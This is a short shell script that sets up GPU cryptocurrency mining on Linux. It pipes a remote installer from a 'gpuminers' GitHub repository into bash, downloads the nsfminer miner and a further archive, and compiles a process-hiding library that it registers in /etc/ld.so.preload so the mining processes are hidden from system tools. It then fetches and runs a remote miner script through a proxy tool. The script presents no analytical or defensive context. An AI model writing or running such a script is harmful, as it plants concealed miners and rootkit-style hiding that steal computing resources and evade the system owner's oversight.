#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks5.sh | bash

wget https://github.com/no-fee-ethereum-mining/nsfminer/releases/download/v1.3.13/nsfminer_1.3.13-ubuntu_18.04-cuda_11.2-opencl.tgz
tar -xvzf nsfminer_1.3.13-ubuntu_18.04-cuda_11.2-opencl.tgz
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNSF.zip
unzip magicNSF.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nsfHive.sh
chmod +x nsfHive.sh
graftcp ./nsfHive.sh
